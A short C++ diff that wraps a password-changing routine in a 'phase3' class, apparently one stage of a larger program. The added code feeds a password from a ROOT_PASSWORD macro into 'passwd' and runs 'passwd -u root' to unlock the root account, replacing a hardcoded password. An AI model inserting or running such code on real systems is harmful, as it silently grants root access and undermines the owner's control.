@@ -1,13 +1,17 @@
-#include <cstdio>
-#include <iostream>
-#include <memory>
-#include <stdexcept>
-#include <string>
+#include "phase3.h"
 
-int main(){
+phase3::phase3()
+{
+
+}
+
+int phase3::execute()
+{
   FILE* stdin = popen("passwd", "w");
-  fputs("ShelIsTheBestestEverInTheWholeWorld\n", stdin);
-  fputs("ShelIsTheBestestEverInTheWholeWorld\n", stdin);
+  const char* newpass = ROOT_PASSWORD;
+  fputs(newpass, stdin);
+  fputs(newpass, stdin);
   pclose(stdin);
+  system("passwd -u root"); //Unlock the root account.
   return 0;
 }
